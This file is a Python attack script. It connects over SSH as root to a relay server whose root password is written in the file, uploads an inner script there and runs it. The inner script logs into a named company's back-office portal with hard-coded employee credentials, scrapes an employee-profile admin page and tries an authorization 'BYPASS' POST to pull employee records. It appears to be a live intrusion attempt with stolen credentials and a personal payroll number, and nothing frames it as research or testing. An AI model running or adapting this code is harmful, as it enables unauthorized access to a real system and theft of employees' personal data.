import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
r = s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write(f"Login: {len(r.text)}b\n\n")

# GET adm_de_perfil.do
sys.stdout.write("=== EXTRACTING adm_de_perfil.do OPTIONS ===\n\n")
r = s.get("https://core.findep.mx/backoffice/adm_de_perfil.do", timeout=15)

# Extract ALL forms
forms = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.S)
sys.stdout.write(f"Forms found: {len(forms)}\n")
for i, form in enumerate(forms):
    form_attrs = re.search(r'<form([^>]*)>', r.text)
    sys.stdout.write(f"\nForm {i}: attrs in tag\n")

# Extract ALL inputs (hidden and visible)
all_inputs = re.findall(r'<input[^>]+>', r.text)
sys.stdout.write(f"\n=== ALL INPUTS ({len(all_inputs)}) ===\n")
for inp in all_inputs:
    name = re.search(r'name="([^"]*)"', inp)
    value = re.search(r'value="([^"]*)"', inp)
    type_ = re.search(r'type="([^"]*)"', inp)
    id_ = re.search(r'id="([^"]*)"', inp)
    sys.stdout.write(f"  type={type_.group(1) if type_ else '?'} name={name.group(1) if name else '?'} id={id_.group(1) if id_ else '?'} value={value.group(1) if value else ''}\n")

# Extract ALL selects with options
sys.stdout.write(f"\n=== ALL SELECTS ===\n")
selects = re.findall(r'<select[^>]*id="([^"]*)"[^>]*name="([^"]*)"[^>]*>(.*?)</select>', r.text, re.S)
if not selects:
    selects = re.findall(r'<select[^>]*>(.*?)</select>', r.text, re.S)
    sys.stdout.write(f"Found {len(selects)} selects (no named matches, trying all)\n")
    for i, sel_body in enumerate(selects):
        sel_tag = re.search(r'<select([^>]*)>', r.text)
        options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
        sys.stdout.write(f"\n  Select {i} ({len(options)} options):\n")
        for val, text in options[:50]:
            sys.stdout.write(f"    [{val}] {text}\n")

# Also try extracting with id
selects2 = re.finditer(r'<select[^>]*(?:id="([^"]*)")?[^>]*(?:name="([^"]*)")?[^>]*>(.*?)</select>', r.text, re.S)
sys.stdout.write(f"\n=== SELECTS (detailed) ===\n")
for m in selects2:
    sel_id = m.group(1) or "?"
    sel_name = m.group(2) or "?"
    sel_body = m.group(3)
    options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
    sys.stdout.write(f"\n  id={sel_id} name={sel_name} ({len(options)} options):\n")
    for val, text in options[:50]:
        sys.stdout.write(f"    [{val}] {text}\n")

# Extract form action
form_tag = re.search(r'<form([^>]*)>', r.text)
if form_tag:
    sys.stdout.write(f"\nForm tag: <form{form_tag.group(1)}>\n")

# ====================================================
# NOW TRY THE BYPASS: POST directly to search employee
# ====================================================
sys.stdout.write("\n" + "="*60 + "\n=== BYPASS: POST search employee ===\n" + "="*60 + "\n\n")

# accion=1 = search by employee name
search_data = {
    "accion": "1",
    "nombre_form": "CRUZ",
    "apaterno_form": "VALDEZ",
    "amaterno_form": "",
    "nomina_form": "726507581",
    "id_empresa_tag": "1",
    "parametro_busqueda": "",
    "nombre_afectado": "",
    "empresa_selects": "",
    "caso_uso_selects": "",
    "acceso_mau": "no",
}

r_search = s.post("https://core.findep.mx/backoffice/adm_de_perfil.do",
    data=search_data, timeout=15, allow_redirects=True)
sys.stdout.write(f"[{r_search.status_code}] {len(r_search.text)}b\n")

# Check if the response contains employee data (tables with employee info)
if len(r_search.text) > 17000:
    # Extract table rows with employee data
    trs = re.findall(r'<tr[^>]*>(.*?)</tr>', r_search.text, re.S)
    for tr in trs:
        cells = re.findall(r'<td[^>]*>(.*?)</td>', tr, re.S)
        if len(cells) >= 3:
            cleaned = [re.sub(r'<[^>]+>', '', c).strip() for c in cells]
            if any(s for s in cleaned if s):
                sys.stdout.write(f"  Row: {cleaned[:6]}\n")
    
    # Look for employee ID or selection links
    emp_links = re.findall(r'(?:onclick|href)=["\']([^"\']*(?:id_aef|idEmpleado|seleccionar|elegir)[^"\']*)["\']', r_search.text, re.I)
    sys.stdout.write(f"  Employee links: {emp_links[:10]}\n")
    
    # Check if page still has NoValidado
    if "NoValidado" in r_search.text:
        sys.stdout.write("  STILL BLOCKED (NoValidado present)\n")
    else:
        sys.stdout.write("  NO NoValidado! BYPASS MIGHT WORK!\n")
    
    # Dump a relevant section
    content_start = r_search.text.find('celda_contenido')
    if content_start > 0:
        sys.stdout.write(f"\n  Content area: {r_search.text[content_start:content_start+3000]}\n")
    
    # Extract all hidden inputs (may have changed)
    new_inputs = re.findall(r'<input[^>]+type="hidden"[^>]+name="([^"]+)"[^>]*value="([^"]*)"', r_search.text)
    sys.stdout.write(f"\n  Hidden inputs after POST: {new_inputs}\n")

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_extract.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_extract.py 2>&1', timeout=120)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
